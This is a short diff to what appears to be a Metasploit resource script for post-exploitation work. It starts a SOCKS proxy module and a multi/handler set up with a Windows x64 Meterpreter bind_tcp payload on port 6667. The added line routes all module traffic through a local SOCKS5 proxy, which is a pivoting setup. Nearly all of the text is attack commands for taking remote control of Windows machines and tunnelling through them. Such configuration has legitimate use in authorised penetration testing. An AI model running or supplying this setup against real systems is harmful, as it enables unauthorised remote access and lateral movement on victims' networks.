@@ -12,6 +12,7 @@ set ReverseListenerBindPort 6665
 run -j 
 use auxiliary/server/socks_proxy
 run -j
+setg Proxies socks5:127.0.0.1:1080
 use exploit/multi/handler
 set payload windows/x64/meterpreter/bind_tcp
 set LPORT 6667
